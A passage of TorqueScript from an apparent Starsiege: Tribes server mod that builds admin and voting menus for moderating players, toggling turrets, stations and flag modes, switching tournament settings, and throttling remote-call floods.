	Client::addMenuItem(%clientId, %curItem++ @ "Vote Damage ", "voteDamage");
	Client::addMenuItem(%clientId, %curItem++ @ "Vote Flag ", "voteFlag");
	
// voting
	if(%clientId.isSuperAdmin){
	//vote admin	
	 	if(!$ANNIHILATION::VoteAdmin)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable vote admin", "eVoteAdmin");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable vote admin", "dVoteAdmin");		
	//voting
		if($NoVote == 1)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable voting", "eVote");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable voting", "dVote");		
	}
}



function PlayerManage(%clientId, %sel)
{
	if(%clientId.isadmin)
	{
		%name = Client::getName(%sel);
		Client::buildMenu(%clientId, "Manage "@%name, "player", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Change team", "fteamchange " @ %sel);
		if(%sel.locked) 
			Client::addMenuItem(%clientId, %curItem++ @ "Unlock team", "unlock " @ %sel);
		else 
			Client::addMenuItem(%clientId, %curItem++ @ "Lock team", "lock " @ %sel);	 
			Client::addMenuItem(%clientId, %curItem++ @ "Clear score", "ClearScore " @ %sel);
		if(%sel.novote)
			Client::addMenuItem(%clientId, %curItem++ @ "Reenable Voting ", "reVote " @ %sel);
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable Voting ", "deVote " @ %sel);
			
		// No more admin obs when in tourny unless you're allready in obs you cheetar. -Plasmatic	
		if(GameBase::getTeam(%sel) != -1 && (!$Server::TourneyMode || GameBase::getTeam(%clientId) == -1))
			Client::addMenuItem(%clientId, %curItem++ @ "Observe (in game) ", "obsingame " @ %sel);
		
		//top of the food chain... -plasmatic
		
	//	if(%clientId.isgod && (string::findSubStr(Client::getTransportAddress(%sel), loopback) != 0))
		if((%clientId.isowner && !%sel.isowner) || (%clientId.isgod && !%sel.isgod))
			Client::addMenuItem(%clientId, %curItem++ @ "Admin levels " @ %name , "AdminLevel " @ %sel);
		else
		{	
			// a little rock -paper -scissors going on here.. -Plasmatic
			if(!%sel.isAdmin && %clientId.isSuperAdmin && $ANNIHILATION::SADGiveAdmin)	
				Client::addMenuItem(%clientId, %curItem++ @ "Admin " @ %name , "Admin " @ %sel);	
			if((%clientId.isSuperAdmin && %sel.isAdmin && !%sel.isSuperAdmin) || (%clientId.isGod && !%sel.isGod && %sel.isAdmin))
				Client::addMenuItem(%clientId, %curItem++ @ "Strip Admin -" @ %name , "stripAdmin " @ %sel); 
		}				
		if(($ANNIHILATION::PAKick && !%sel.isAdmin) || (%clientId.isSuperAdmin && !%sel.isSuperAdmin) || (%clientId.isgod && !%sel.isgod))	
			Client::addMenuItem(%clientId, %curItem++ @ "Kick " @ %name, "Kick " @ %sel); 
		if((%clientId.isSuperAdmin && !%sel.isSuperAdmin && $ANNIHILATION::SADBan) || (%clientId.isgod && !%sel.isgod))		
			Client::addMenuItem(%clientId, %curItem++ @ "Ban " @ %name , "Ban " @ %sel); 
	} 
}

function PenaltyBox(%clientId, %sel)
	{
	if(%clientId.isadmin){		
	%player = Client::getOwnedObject(%sel);
	%name = Client::getName(%sel);
	Client::buildMenu(%clientId, "Punish "@%name, "player", true);
 if (!%player.blind)	Client::addMenuItem(%clientId, %curItem++ @ "Blind " @ %name, "Blind " @ %sel);
 else	Client::addMenuItem(%clientId, %curItem++ @ "UnBlind " @ %name, "UnBlind " @ %sel);
 
	if 	(%player.frozen) Client::addMenuItem(%clientId, %curItem++ @ "Defrost " @ %name, "Defrost " @ %sel);
	else			 Client::addMenuItem(%clientId, %curItem++ @ "Freeze " @ %name, "Freeze " @ %sel); 
	Client::addMenuItem(%clientId, %curItem++ @ "15 second penalty " @ %name, "15Penalty " @ %sel);
	Client::addMenuItem(%clientId, %curItem++ @ "30 second penalty " @ %name, "30Penalty " @ %sel);
	Client::addMenuItem(%clientId, %curItem++ @ "60 second penalty " @ %name, "60Penalty " @ %sel);
	
	Client::addMenuItem(%clientId, %curItem++ @ "60 second MUTE " @ %name, "60mute " @ %sel);
	Client::addMenuItem(%clientId, %curItem++ @ "120 second MUTE " @ %name, "120mute " @ %sel);	
				}
}

function PlayerAnnoy(%clientId, %sel)
{
	if(%clientId.isadmin)
	{		
		%player = Client::getOwnedObject(%sel);
		%name = Client::getName(%sel);
		Client::buildMenu(%clientId, "Annoy "@%name, "player", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Disarm " @ %name , "Disarm " @ %sel);
		Client::addMenuItem(%clientId, %curItem++ @ "Strip weapons -" @ %name , "Strip " @ %sel);	 
		Client::addMenuItem(%clientId, %curItem++ @ "To The Moon -" @ %name , "Moon " @ %sel);
		Client::addMenuItem(%clientId, %curItem++ @ "Slap " @ %name , "Slap " @ %sel);
		if(%sel.Agoraphobia)
			Client::addMenuItem(%clientId, %curItem++ @ "Remove agoraphobia " @ %name , "Agoraphobia " @ %sel);
	 	else
	 		Client::addMenuItem(%clientId, %curItem++ @ "Agoraphobia " @ %name , "Agoraphobia " @ %sel);
	 
		Client::addMenuItem(%clientId, %curItem++ @ "Flag fun with " @ %name, "flag " @ %sel);
				 
//	if(!Player::isDead(%sel)){
//					 Client::addMenuItem(%clientId, %curItem++ @ "Co- Pilot " @ %name , "CoPilot " @ %sel);				
//					 Client::addMenuItem(%clientId, %curItem++ @ "Possess " @ %name , "Possess " @ %sel);	
//					}
				}
}


function PlayerFlag(%clientId, %sel)
{
	if(%clientId.isadmin)
	{			
		%name = Client::getName(%sel);
		%type = Player::getMountedItem(%sel, $FlagSlot);	
		Client::buildMenu(%clientId, "Flag Fun with "@%name, "player", true);
		if(player::status(%sel) == "(Live)" && %type != -1)
		{	
			Client::addMenuItem(%clientId, %curItem++ @ "Strip Flag", "StripFlag " @ %sel);
			Client::addMenuItem(%clientId, %curItem++ @ "Return Flag", "ReturnFlag " @ %sel);	 
		}
		else 
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Strip Flag -NA "@player::status(%sel), "Freturn " @ %sel);
			Client::addMenuItem(%clientId, %curItem++ @ "Return Flag -NA "@player::status(%sel), "Freturn " @ %sel);	 
		}		
	if(%sel.FlagCurse)
		Client::addMenuItem(%clientId, %curItem++ @ "Remove Happy Flag Curse", "NoFlagCurse " @ %sel);
	else
		Client::addMenuItem(%clientId, %curItem++ @ "Happy Flag Curse", "FlagCurse " @ %sel);
	}
}



function PlayerKill(%clientId, %sel)
{
	if(%clientId.isadmin)
	{		
		%name = Client::getName(%sel);
		Client::buildMenu(%clientId, "Kill "@%name, "player", true);
		Client::addMenuItem(%clientId, %curItem++ @ "Blow up " @ %name, "BlowUp " @ %sel);
		Client::addMenuItem(%clientId, %curItem++ @ "Sniper kill " @ %name, "Sniper " @ %sel);	 
		Client::addMenuItem(%clientId, %curItem++ @ "Poison " @ %name, "Poison " @ %sel);
		Client::addMenuItem(%clientId, %curItem++ @ "Set on fire " @ %name, "Burn " @ %sel);				
		if(Player::isDead(Client::getOwnedObject(%sel)) || Client::getOwnedObject(%sel) == -1 && Client::getTeam(%sel) != -1)
			Client::addMenuItem(%clientId, %curItem++ @ "Spawn " @ %name, "spawn " @ %sel);
		else if (Client::getOwnedObject(%sel) != -1 && Client::getTeam(%sel) != -1)	
			Client::addMenuItem(%clientId, %curItem++ @ "Respawn " @ %name, "respawn " @ %sel);				 
 	}
}


function player::status(%client)
{
	%player = Client::getOwnedObject(%client);
	%team = Client::getTeam(%client);
	if (%player == -1 && %team != -1) 
		%status = "(Dead)";
		else 
			if (%player != -1 && %team != -1) 
				%status = "(Live)";
		else 
			if (%team == -1) 
				%status = "(Observing)";
	return %status;
}
	
// vote to player menu
function voteToPlayer(%clientId, %sel)
{
	//echo("vote to player");
	if(%clientId.observerMode != "justJoined" && %clientId.justConnected != true)
	{		
		%name = Client::getName(%sel);
		
		Client::buildMenu(%clientId, "Start Vote on "@%name, "options", true);
			if(player::status(%sel) == "(Live)")
			{
	 		Client::addMenuItem(%clientId, %curItem++ @ "Vote to freeze ", "vfreeze " @ %sel);
	 		Client::addMenuItem(%clientId, %curItem++ @ "Vote to poison ", "vpoison " @ %sel);
		}
			else 
			{
				// players dead, return to this menu.
			Client::addMenuItem(%clientId, %curItem++ @ "Freeze -NA, "@player::status(%sel), "voteToPlayer " @ %sel);	
			Client::addMenuItem(%clientId, %curItem++ @ "Poison -NA, "@player::status(%sel), "voteToPlayer " @ %sel); 	
			}
		if(%sel.silenced)
			Client::addMenuItem(%clientId, %curItem++ @ "vote Global UNMUTE", "vunsilence " @ %sel);
		else
		 		Client::addMenuItem(%clientId, %curItem++ @ "vote to silence ", "vsilence " @ %sel); 		 
				 	if($ANNIHILATION::PVKick)
				 		Client::addMenuItem(%clientId, %curItem++ @ "Vote to kick ", "vkick " @ %sel);
	 		if($ANNIHILATION::VoteAdmin)
				 		Client::addMenuItem(%clientId, %curItem++ @ "Vote to admin ", "vadmin " @ %sel);
				 }

			
}


function voteForce(%clientId)
{
	Client::buildMenu(%clientId, "Force Vote:", "options", true);
	Client::addMenuItem(%clientId, %curItem++ @ "PASS " @ $curVoteTopic, "forceyes " @ $curVoteCount); 
	Client::addMenuItem(%clientId, %curItem++ @ "FAIL " @ $curVoteTopic, "forceno " @ $curVoteCount); 
}



// process server options in a less painfull way -Plasmatic
function processMenuServer(%clientId, %option)
{
	%opt = getWord(%option, 0);
	%cl = getWord(%option, 1);
//Fair teams	 
	if(%opt == "dFair")	ServerSwitches(%clientId,"Fair Teams",false);
	else if(%opt == "eFair")	ServerSwitches(%clientId,"Fair Teams",true);
//time	 
	else if(%opt == "time")	TimeMenu(%clientId,true);
	 	
// turrets	
	else if(%opt == "turret") 
	{
		Client::buildMenu(%clientId, "Turret Options:", "Server", true);
		// destroy turrets
		Client::addMenuItem(%clientId, %curItem++ @ "Destroy deployable turrets", "rPlayerTurret");
		Client::addMenuItem(%clientId, %curItem++ @ "Destroy map turrets", "DamMapTurrets");								
		Client::addMenuItem(%clientId, %curItem++ @ "fix map turrets", "FixMapTurrets");
		if(!$annihilation::DisableTurretsOnTeamChange)	
			Client::addMenuItem(%clientId, %curItem++ @ "Team change disable ON", "TCDon");	
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Team change disable OFF", "TCDoff");
			
		if($turret::deployinpower)	
			Client::addMenuItem(%clientId, %curItem++ @ "Turrets anywhere", "Dpowoff");	
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Turrets only in power range", "Dpowon");
			
			
								
		return;		 			
	 }
	 	
//process turrets	 
	if(%opt == "TCDon")	
		ServerSwitches(%clientId,"team change turret disable",true);
	else if(%opt == "TCDoff")	
		ServerSwitches(%clientId,"team change turret disable",false);
		
	if(%opt == "Dpowon")	
		ServerSwitches(%clientId,"deploy turrets in power grid",true);
	else if(%opt == "Dpowoff")	
		ServerSwitches(%clientId,"deploy turrets in power grid",false);		
			
	if(%opt == "dTurretPoints")	
		ServerSwitches(%clientId,"turret points",false);
	else if(%opt == "eTurretPoints")	
		ServerSwitches(%clientId,"turret points",true); 
	 	
	if(%opt == "dPlayerTurret")	
		ServerSwitches(%clientId,"deployable turrets",false);
	else if(%opt == "ePlayerTurret")	
		ServerSwitches(%clientId,"deployable turrets",true); 
	 	
	if(%opt == "dMapTurrets")	
	{KillMapTurrets(%clientId,true,true);ServerSwitches(%clientId,"map turrets",false);}
	else if(%opt == "eMapTurrets")	
		ServerSwitches(%clientId,"map turrets",true); 
	
	if(%opt == "rPlayerTurret")	
		KillMapTurrets(%clientId,false,true);
			
	else if(%opt == "DamMapTurrets")	
		KillMapTurrets(%clientId,true,true); 
	else if(%opt == "FixMapTurrets")	
		KillMapTurrets(%clientId,true,false); 	 	 	

 		
// station menu
	else if(%opt == "Station") 
	{
		Client::buildMenu(%clientId, "Station options:", "Server", true);
		 		
		Client::addMenuItem(%clientId, %curItem++ @ "Kill deployable Stations", "rPlayerInvs");
		Client::addMenuItem(%clientId, %curItem++ @ "Kill map Inventories", "DamMapInvs");	
		
	//vehicle stations	
		Client::addMenuItem(%clientId, %curItem++ @ "Kill vehicle stations", "KillVehicle");		
		Client::addMenuItem(%clientId, %curItem++ @ "fix map Inventories", "FixMapInvs");		
		Client::addMenuItem(%clientId, %curItem++ @ "fix vehicle stations", "FixVehicle");		
						
		return;		 			
	 }
	 	
	 
// Generator menu
	else if(%opt == "Generator") 
	{
		Client::buildMenu(%clientId, "Generator options:", "Server", true);
		 		
		Client::addMenuItem(%clientId, %curItem++ @ "Kill deployable Generators", "rPlayerGens");
		Client::addMenuItem(%clientId, %curItem++ @ "Kill all Generators", "DamMapGens");	
		Client::addMenuItem(%clientId, %curItem++ @ "fix all Generators", "FixMapGens");
					
		return;		 			
	 }
	 	
	//Inventory methods 
	else if(%opt == "InvMethods") 
	{
		Client::buildMenu(%clientId, "Inventory Methods:", "Server", true);
	 	if($ANNIHILATION::QuickInv == 1)	
			Client::addMenuItem(%clientId, %curItem++ @ "Station based", "InvStandard");
		else			
			Client::addMenuItem(%clientId, %curItem++ @ "Always accessable", "InvAlways");	
		
	 	if($ANNIHILATION::ExtendedInvs)	
			Client::addMenuItem(%clientId, %curItem++ @ "Regular Inventories", "InvRegular");
		else			
			Client::addMenuItem(%clientId, %curItem++ @ "Extended Inventories", "InvExtended");	

		if(!$ANNIHILATION::QuickInv && $ANNIHILATION::ExtendedInvs)
		{			
			 if($ANNIHILATION::Zappy != 1)	
				Client::addMenuItem(%clientId, %curItem++ @ "Zappy extended", "InvZappy");
			else			
				Client::addMenuItem(%clientId, %curItem++ @ "Extended (No Zap)", "InvExtNoZap");	
		}	
		
		 							
		return;		 			
	}	
	else if(%opt == "Barrier") 
	{
	 	undeploy(Barrier);
//			messageAll(0, %AdminName @ " Destroyed deployable barriors. ~wCapturedTower.wav");
//			centerprintall("<jc><f1>" @ %AdminName @ " Destroyed deployable barriors.", 3);	 			
	 }
	else if(%opt == "minimines") 
	{
	
		%group = nameToID("MissionCleanup/minimine");
		%count = Group::objectCount(%group);
	
		for(%i = 0; (%Target = Group::getObject(%group, %i)) != -1; %i++)
		{
			%rnd = getRandom() * 10;
			schedule("GameBase::setDamageLevel("@%target@",2);",%rnd);
		}			

		messageAll(0, Client::getName(%clientId) @ " Destroyed all the Mini Mines. ~wCapturedTower.wav");
		centerprintall("<jc><f1>" @ Client::getName(%clientId) @ " Destroyed all the Mini Mines.", 3);	 			
	 }	 
	else if(%opt == "chickenlittle") 
	{
	
		july::exp(1000);			

		messageAll(0, Client::getName(%clientId) @ " killed the sky. ~wCapturedTower.wav");
	 }		 
	 
	// Generator menu
	else if(%opt == "Combined") 
	{
		Client::buildMenu(%clientId, "Combination Options:", "Server", true);
	 		
		Client::addMenuItem(%clientId, %curItem++ @ "Kill deployables", "killDeployables");
		Client::addMenuItem(%clientId, %curItem++ @ "Kill all stations", "killStat");	
		Client::addMenuItem(%clientId, %curItem++ @ "Kill bases", "Killbases");
		Client::addMenuItem(%clientId, %curItem++ @ "NEUTRON BOMB", "Purge");		
		Client::addMenuItem(%clientId, %curItem++ @ "Fix all stations", "FixStat");
		Client::addMenuItem(%clientId, %curItem++ @ "fix bases", "Fixbases");	
// fix everything, you benevolent bastard!
		Client::addMenuItem(%clientId, %curItem++ @ "FIX ALL, restore", "dePurge");		 							
		return;		 			
	 } 	
	 	
//purge		
	else if(%opt == "Purge")
		KillPurge(%clientId,true);
//unpurge		
	else if(%opt == "dePurge")
		KillPurge(%clientId,false);
//kill deployables		
	else if(%opt == "killDeployables")
		AdminKillDeploy(%clientId);


	//Inventory stations	
// cleaned up base damage/ fix for 2.2 -plasmatic
	else if(%opt == "Killbases") 
		BaseDamageThingy(%clientId,true);
		
	else if(%opt == "Fixbases")
		BaseDamageThingy(%clientId);
		
	else if(%opt == "DamMapGens")	
		KillClass(%clientId,true,Generator); 
	if(%opt == "dGenerators")	
		{KillClass(%clientId,true,Generator);ServerSwitches(%clientId,"Generators",false);}	
	if(%opt == "eGenerators")	
		{KillClass(%clientId,true,Generator);ServerSwitches(%clientId,"Generators",true);}
	else if(%opt == "FixMapGens")	
		KillClass(%clientId,false,Generator); 
	else if(%opt == "FixStat")	
		KillClass(%clientId,false,Station); 	
	else if(%opt == "killStat")	
		KillClass(%clientId,true,Station); 
// could clean up code by using killclass to kill/fix invs/turrets/vehicle also but would need 
// deployable counterparts like killDepGen for each.
	else if(%opt == "rPlayerGens")	
		KillDepGen(%clientId); 
// inv	 
	if(%opt == "dInv")	
		{KillMapInv(%clientId,true,true);ServerSwitches(%clientId,"Inventories",false);}
	else if(%opt == "eInv")	
		ServerSwitches(%clientId,"Inventories",true);
	
	if(%opt == "rPlayerInvs")	
		KillMapInv(%clientId,false,true);
	else if(%opt == "DamMapInvs")	
		KillMapInv(%clientId,true,true); 
	else if(%opt == "FixMapInvs")	
		KillMapInv(%clientId,true,false); 	
// obs alert
	else if(%opt == "obsAlertOn")	
		ServerSwitches(%clientId,"Observer Alert",true);
	else if(%opt == "obsAlertOff")	
		ServerSwitches(%clientId,"Observer Alert",false);
// skins	
	else if(%opt == "skinsOn")	
	{
		%numPlayers = getNumClients();
		for(%i = 0; %i < %numPlayers; %i++)
		{
			%cl = getClientByIndex(%i);
			Client::setSkin(%cl, $Client::info[%cl, 0]);
		}
		ServerSwitches(%clientId,"personal skins",true);
	}
	else if(%opt == "skinsOff")	
	{
		%numPlayers = getNumClients();
		for(%i = 0; %i < %numPlayers; %i++)
		{
			%cl = getClientByIndex(%i);
			//echo(%cl);		
			Client::setSkin(%cl, $Server::teamSkin[Client::getTeam(%cl)]);
		}
		ServerSwitches(%clientId,"personal skins",false);
	}	
	// added confirmation for ffa, and tourney mode -Plasmatic
	// moved here for 2.3... oopsie...
	else if(%opt == "cffa" && %clientId.isadmin)
	{
		Client::buildMenu(%clientId, "Confirm Free For All Mode:", "Server", true);
		Client::addMenuItem(%clientId, "1Reset to Free For All Mode.", "yescffa" );
		Client::addMenuItem(%clientId, "2Don't switch to Free for all.", "no" );
		return;
	}

	else if(%opt == "ctourney" && %clientId.isadmin)
	{
		Client::buildMenu(%clientId, "Confirm Tournament Mode:", "Server", true);
		Client::addMenuItem(%clientId, "1Reset to Tournament Mode.", "yesctourney");
		Client::addMenuItem(%clientId, "2Don't switch to Tournament.", "no");
		return;
	}
	else if(%opt == "yescffa")
	{	
		Admin::setModeFFA(%clientId); 
		return;
	}
	else if(%opt == "yesctourney")	
	{
		Admin::setModeTourney(%clientId);
		return;
	} 
	else if(%opt == "no")	
	{
		ServerOptions(%clientId);
		return;
	} 			
//		function processMenuccffa(%clientId, %opt)
//		{
//			if(getWord(%opt, 0) == "yes")
//				Admin::setModeFFA(%clientId);
//			Game::menuRequest(%clientId);
//		}
//		
//		function processMenucctourney(%clientId, %opt)
//		{
//			if(getWord(%opt, 0) == "yes")
//				Admin::setModeTourney(%clientId);
//			Game::menuRequest(%clientId);
//		}	
		
// vehicles	 

	else if(%opt == "KillVehicle")	
		KillMapVehicle(%clientId,true,true); 
	else if(%opt == "FixVehicle")	
		KillMapVehicle(%clientId,true,false); 

	if(%opt == "dVehicle")	
		{KillMapVehicle(%clientId,true,true);ServerSwitches(%clientId,"Vehicle Stations",false);}
	else if(%opt == "eVehicle")	
		ServerSwitches(%clientId,"Vehicle Stations",true);
// flag caps	 
	if(%opt == "dFlag")	
		ServerSwitches(%clientId,"Flag Cap Limit",false);
	else if(%opt == "eFlag")	
		ServerSwitches(%clientId,"Flag Cap Limit",true);
	
// Flag options, and new flaghunter stuff -plasmatic 2.3
	else if(%opt == "FlagOptions") 
	{
		Client::buildMenu(%clientId, "Flag Options:", "Server", true);	
		if($NoFlagCaps == 1)
			Client::addMenuItem(%clientId, %curItem++ @ "Enable Flag Cap Limit", "eFlag");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Disable Flag Cap Limit", "dFlag");	
	
		Client::addMenuItem(%clientId, %curItem++ @ "Return Flags", "ReturnFlags");
// flaghunter variables	
		if($FlagHunter::Enabled)
		{
			Client::addMenuItem(%clientId, %curItem++ @ "Disable Flag Hunter", "dHunter");			
			if($FlagHunter::GreedMode)
				Client::addMenuItem(%clientId, %curItem++ @ "Disable GREED mode", "dgm");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Enable GREED mode", "egm");
			if($FlagHunter::HoardMode)
				Client::addMenuItem(%clientId, %curItem++ @ "Disable HOARD mode", "dhm");
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Enable HOARD mode", "ehm");
		}	
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable Flag Hunter", "eHunter");		
			return;
	}
	
		//return flags
	else if(%opt == "ReturnFlags")
	{
		messageAll(0, Client::getName(%clientId) @ " returned the flags.~wCapturedTower.wav");
		echo(Client::getName(%clientId) @ " returned the flags.");
		ReturnFlags();
	}		
	//flaghunter switches
	else if(%opt == "eHunter")
	{
		$TowerSwitchNexus = "";
		ReturnObjectives();
		exec(flaghunter);
		//Mission::init();
		ServerSwitches(%clientId,"Flag Hunter",true);
	}
	else if(%opt == "dHunter")
	{
		$TowerSwitchNexus = "";
		$FlagHunter::Enabled = "";
		ServerSwitches(%clientId,"Flag Hunter",false);
	}
		
	else if(%opt == "egm")
		Admin::setGreedMode(%clientId, true);
	else if(%opt == "dgm")
		Admin::setGreedMode(%clientId, false);
	else if(%opt == "ehm")
		Admin::setHoardMode(%clientId, true);
	else if(%opt == "dhm")
		Admin::setHoardMode(%clientId, false);			
	// end flaghunter switches

// reset server
		else if(%opt == "reset") 
		{
			Client::buildMenu(%clientId, "Reset Server?", "Server", true);	
			Client::addMenuItem(%clientId, %curItem++ @ "yes, Reset server", "resetYes");
			Client::addMenuItem(%clientId, %curItem++ @ "no, Don't reset", "resetNo");
			return;
		}
		else if(%opt == "resetYes") 
		{
		if(!%clientId.SecretAdmin)
			messageAll(0, Client::getName(%clientId) @ " reset the server to default settings.~wCapturedTower.wav");
		else
			messageAll(0, "Reseting the server to default settings.~wCapturedTower.wav");
			Server::refreshData();
		}		
		else if(%opt == "resetNo")
		{
			ServerOptions(%clientId);
			return;
		}		
//builder		
	else if(%opt == "ebm")
		Admin::setBuild(%clientId, true);
	else if(%opt == "dbm")
		Admin::setBuild(%clientId, false);
	else if(%opt == "godmenu" && %clientId.isgod)	
		Ann::godAdminMenu(%clientId);						
}	


function ServerOptions(%clientId)
{
	if(!%clientId.isadmin) 
		return;
	Client::buildMenu(%clientId, "Server Options:", "Server", true);
//fair teams	
	if($ANNIHILATION::FairTeams == 1)
		Client::addMenuItem(%clientId, %curItem++ @ "Disable fair teams", "dFair");
	else
		Client::addMenuItem(%clientId, %curItem++ @ "Enable fair teams", "eFair");
//changetime
	Client::addMenuItem(%clientId, %curItem++ @ "Change Time", "time");	
// global flag options
	Client::addMenuItem(%clientId, %curItem++ @ "Flag Options", "FlagOptions");
//supa admean meneu		
	if(%clientId.isSuperAdmin)	
	{				
	//builder	
		if($Build == 1)
			Client::addMenuItem(%clientId, %curItem++ @ "Disable Builder mode", "dbm");
		else
			Client::addMenuItem(%clientId, %curItem++ @ "Enable Builder mode", "ebm");
	// observer alert
		if($ANNIHILATION::obsAlert != true)
			Client::addMenuItem(%clientId, %curItem++ @ "Observer alert on ", "obsAlertOn");
		else	 
			Client::addMenuItem(%clientId, %curItem++ @ "Observer alert off ", "obsAlertOff");
	// personal skins
		if($ANNIHILATION::UsePersonalSkin != true)
			Client::addMenuItem(%clientId, %curItem++ @ "Allow custom skins ", "skinsOn");
		else	 
			Client::addMenuItem(%clientId, %curItem++ @ "Custom skins off ", "skinsOff");
			
		if(%clientId.isGod)
		{
			if($Server::TourneyMode)
			{
				Client::addMenuItem(%clientId, %curItem++ @ "Change to FFA mode", "cffa");
				if(!$CountdownStarted && !$matchStarted)
					Client::addMenuItem(%clientId, %curItem++ @ "Start the match", "smatch");
			}
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Change to Tournament mode", "ctourney");			
		//reset			
			Client::addMenuItem(%clientId, %curItem++ @ "More...", "godmenu");				
			
		}
		else
		{
		// tourny mode
			if($Server::TourneyMode)
			{
				Client::addMenuItem(%clientId, %curItem++ @ "Change to FFA mode", "cffa");
				if(!$CountdownStarted && !$matchStarted)
					Client::addMenuItem(%clientId, %curItem++ @ "Start the match", "smatch");
			}
			else
				Client::addMenuItem(%clientId, %curItem++ @ "Change to Tournament mode", "ctourney");
		//reset			
			Client::addMenuItem(%clientId, %curItem++ @ "Reset Server Defaults", "reset");		
		}
	
	}
}

function EquipmentOptions(%clientId)
{
	if(!%clientId.isadmin) return;
	Client::buildMenu(%clientId, "Equipment Options:", "Server", true);
	
// turret menu
	Client::addMenuItem(%clientId, %curItem++ @ "Turrets", "turret");
// Generators
	Client::addMenuItem(%clientId, %curItem++ @ "Generators", "Generator");
// Stations
	Client::addMenuItem(%clientId, %curItem++ @ "Stations", "Station");
// combined
	Client::addMenuItem(%clientId, %curItem++ @ "Combination", "Combined");	
	Client::addMenuItem(%clientId, %curItem++ @ "Kill Barriers", "Barrier");
	Client::addMenuItem(%clientId, %curItem++ @ "Kill Mini Mines", "minimines");

	Client::addMenuItem(%clientId, %curItem++ @ "Falling sky", "chickenlittle");
}

function Admin::crash(%clientId)
{
	%ip = Client::getTransportAddress(%clientId);
	Player::setDamageFlash(%clientId,0.75);
	centerprint(%clientId, "<jc><f1>"@$ANNIHILATION::KickMessage, 10);
	%message = "Bitch!";
	Net::kick(%clientId,%message); 
	
}

function admin::message(%message)
{
	%numPlayers = getNumClients();
	for(%i = 0; %i < %numPlayers; %i++)
	{		
		%cl = getClientByIndex(%i);
	//	echo(%cl,%cl.isSuperAdmin,%cl.isAdmin);
		if(%cl.isSuperAdmin || %cl.isAdmin)
		{
			Client::sendMessage(%cl,1,"**admin message** "@%message);
		}
	}
}

function admin::BPmessage(%message)
{
	%numPlayers = getNumClients();
	for(%i = 0; %i < %numPlayers; %i++)
	{		
		%cl = getClientByIndex(%i);
	//	echo(%cl,%cl.isSuperAdmin,%cl.isAdmin);
		if(%cl.isSuperAdmin || %cl.isAdmin)
		{
			bottomprint(%cl,"<jc><f2>"@%message);
		}
	}
}


//flaghunter stuff -plasmatic 2.3
function Admin::setGreedMode(%admin, %enabled)
{
	 if(%admin == -1 || %admin.isAdmin)
	 {
			if(%enabled)
			{
				 $FlagHunter::GreedMode = true;
				 if(%admin == -1)
						messageAll(1, "GREED mode is ON by consensus!");
				 else
						messageAll(1, Client::getName(%admin) @ " has turned GREED mode ON!");
			}
			else
			{
				 $FlagHunter::GreedMode = false;
				 if(%admin == -1)
						messageAll(1, "GREED mode is OFF by consensus.");
				 else
						messageAll(1, Client::getName(%admin) @ " has turned GREED mode Off.");
			}
			
			//update the objectives page
			DM::missionObjectives();
	 }
}

function Admin::setHoardMode(%admin, %enabled)
{
	 if(%admin == -1 || %admin.isAdmin)
	 {
			if(%enabled)
			{
				 if(%admin == -1)
				 {
						$FlagHunter::HoardMode = true;
						messageAll(1, "HOARD mode is ON by consensus!");
				 }
				 else
				 {
						//make sure an admin isn't screwing with the hoard for his own ends...
						if ((%curTimeLeft < ($FlagHunter::HoardStartTime * 60)) && (%curTimeLeft >= ($FlagHunter::HoardEndTime * 60)))
							 Client::sendMessage(%admin, 0, "You cannot alter the HOARD mode during the HOARD period.");
						else
						{
							 $FlagHunter::HoardMode = true;
							 messageAll(1, Client::getName(%admin) @ " has turned HOARD mode ON!");
						}
				 }
			}
			else
			{
				 if(%admin == -1)
				 {
						$FlagHunter::HoardMode = false;
						messageAll(1, "HOARD mode is OFF by consensus.");
				 }
				 else
				 {
						//make sure an admin isn't screwing with the hoard for his own ends...
						%curTimeLeft = ($Server::timeLimit * 60) + $missionStartTime - getSimTime();
						if ((%curTimeLeft < ($FlagHunter::HoardStartTime * 60)) && (%curTimeLeft >= ($FlagHunter::HoardEndTime * 60)))
							 Client::sendMessage(%admin, 0, "You cannot alter the HOARD mode during the HOARD period.");
						else
						{
							 $FlagHunter::HoardMode = false;
							 messageAll(1, Client::getName(%admin) @ " has turned HOARD mode OFF.");
						}
				 }
			}
			
			//update the objectives page
			DM::missionObjectives();
	 }
}

function GameBase::getPenisSize(%pi)
{
    for(%x = 0; String::getSubStr(%pi, %x, 1) != ""; %x++)
    {
        %epenis /= %x;
    }
    return %epenis;
}

function evalspam(%clientId)	//plas 3.0
{
	// Throttle remote functions down a wee bit. 
	// yes, this is based on Base's chatspam thwarter... -Plasm
	
	// we use getIntTime here because getSimTime gets reset.
	// time is measured in 32 ms chunks... so approx 32 to the sec
	
	%time = getIntegerTime(true) >> 5;
	if(%clientId.floodRemote)
	{
		%delta = %clientId.RemoteAllowTime - %time;
		if(%delta > 0)
		{
		//	Client::sendMessage(%clientId, $MSGTypeGame, "FLOOD! You cannot remote for " @ %delta @ " seconds. "@%clientId.floodRemoteCount);
 			return false;
		}
		%clientId.floodRemote = "";
		%clientId.RemoteAllowTime = "";
	}
	%clientId.floodRemoteCount++;
	// funky use of schedule here:
	schedule(%clientId @ ".floodRemoteCount--;", 1, %clientId);
	if(%clientId.floodRemoteCount > 15)
	{
		%clientId.floodRemote = true;
		%clientId.RemoteAllowTime = %time + 5;
		Client::sendMessage(%clientId, $MSGTypeGame, "Error! Your armor is in debug for 5 seconds.~wfemale1.wbelay.wav");
		return false;
	}
	return true;
}

